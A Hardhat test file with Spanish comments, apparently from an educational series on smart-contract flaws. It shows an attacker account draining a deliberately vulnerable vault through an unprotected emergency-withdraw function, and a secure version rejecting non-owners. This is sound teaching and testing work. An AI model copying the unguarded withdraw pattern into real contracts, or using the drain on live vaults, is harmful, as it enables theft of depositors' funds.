import { expect } from "chai";
import hre from "hardhat";

describe("03 - Access Control Failure", function () {
  let ethers;
  let Vulnerable, vulnerableContract;
  let Secure, secureContract;
  let owner, user1, user2, attacker;
  let DEPOSIT_AMOUNT;

  before(async function () {
    const connection = await hre.network.getOrCreate();
    ethers = connection.ethers;
    DEPOSIT_AMOUNT = ethers.parseEther("5");
    [owner, user1, user2, attacker] = await ethers.getSigners();
  });

  beforeEach(async function () {
    // Desplegar versión Vulnerable
    Vulnerable = await ethers.getContractFactory("VaultVulnerable");
    vulnerableContract = await Vulnerable.deploy();

    // Desplegar versión Segura
    Secure = await ethers.getContractFactory("VaultSecure");
    secureContract = await Secure.deploy();
  });

  describe("Exploit en Contrato Vulnerable", function () {
    it("Debería permitir a CUALQUIERA vaciar el contrato", async function () {
      // 1. Usuarios legítimos depositan fondos en la bóveda
      await vulnerableContract.connect(user1).deposit({ value: DEPOSIT_AMOUNT });
      await vulnerableContract.connect(user2).deposit({ value: DEPOSIT_AMOUNT });

      const vaultBalanceAntes = await ethers.provider.getBalance(await vulnerableContract.getAddress());
      expect(vaultBalanceAntes).to.equal(ethers.parseEther("10"));

      // 2. El atacante llama a la función sin protección
      await vulnerableContract.connect(attacker).emergencyWithdrawAll();

      // 3. Verificamos que la bóveda quedó vacía
      const vaultBalanceDespues = await ethers.provider.getBalance(await vulnerableContract.getAddress());
      expect(vaultBalanceDespues).to.equal(0n);
    });
  });

  describe("Defensa en Contrato Seguro", function () {
    it("Debería bloquear al atacante y solo permitir al owner retirar", async function () {
      // 1. Usuarios depositan fondos
      await secureContract.connect(user1).deposit({ value: DEPOSIT_AMOUNT });
      
      // 2. El atacante intenta vaciar la bóveda
      try {
        await secureContract.connect(attacker).emergencyWithdrawAll();
        expect.fail("Debería haber revertido por falta de permisos");
      } catch (error) {
        expect(error.message).to.contain("Acceso denegado: No eres el owner");
      }

      // 3. El Owner legítimo SÍ puede llamar a la función
      await secureContract.connect(owner).emergencyWithdrawAll();

      // 4. Verificamos que los fondos se extrajeron de forma segura
      const vaultBalanceDespues = await ethers.provider.getBalance(await secureContract.getAddress());
      expect(vaultBalanceDespues).to.equal(0n);
    });
  });
});
